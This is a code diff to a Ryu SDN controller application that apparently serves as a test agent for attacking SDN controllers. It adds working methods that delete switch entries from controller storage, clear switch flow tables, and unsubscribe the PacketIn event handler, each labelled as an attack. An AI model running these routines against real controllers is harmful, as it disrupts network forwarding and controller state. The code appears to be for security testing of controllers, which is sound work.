@@ -8,16 +8,22 @@ from ryu.lib.packet import packet
 from ryu.lib.packet import ethernet
 from ryu.controller import dpset
 from ryu.ofproto import ofproto_v1_3
+from ryu.controller import conf_switch
+import sys
+import array
+import itertools
 
 class AppAgent13(app_manager.RyuApp):
     OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]
     _CONTEXTS = {
-        'dpset': dpset.DPSet
+        'dpset': dpset.DPSet,
+        'switchset': conf_switch.ConfSwitchSet
     }
 
     def __init__(self, *args, **kwargs):
         super(AppAgent13, self).__init__(*args, **kwargs)
         self.dpset = kwargs['dpset']
+        self.switchset = kwargs['switchset']
         self.drop = 0
         self.modify = 0
         self.clear = 0
@@ -62,6 +68,8 @@ class AppAgent13(app_manager.RyuApp):
     # TODO:
     def testInternalStorageAbuse(self):
         self.logger.info("testInternalStorageAbuse")
+        for dp in self.dpset.dps.values():
+            self.switchset.del_dpid(dp.id)
 
     # 3.1.070
     def testFlowRuleModification(self):
@@ -85,6 +93,7 @@ class AppAgent13(app_manager.RyuApp):
     # 3.1.080
     def testFlowTableClearance(self):
         self.logger.info("[ATTACK] Start Flow Table Clearance")
+        self.callFlowTableClearance()
         self.clear = 1
 
     def callFlowTableClearance(self):
@@ -97,9 +106,12 @@ class AppAgent13(app_manager.RyuApp):
             dp.send_msg(flow_mod)
 
     # 3.1.090
-    # TODO:
+    # TODO: How to manage the error when the attack is started.
     def testEventListenerUnsubscription(self):
-        self.logger.info("testEventListenerUnsubscription")
+        self.logger.info("[ATTACK] Event Listener Unsubscription")
+        del ofp_event._OFP_MSG_EVENTS['EventOFPPacketIn']
+        self.logger.info("Unsubscription of EventOFPPacketIn")
+
 
     # 3.1.110
     def testMemoryExhaustion(self):
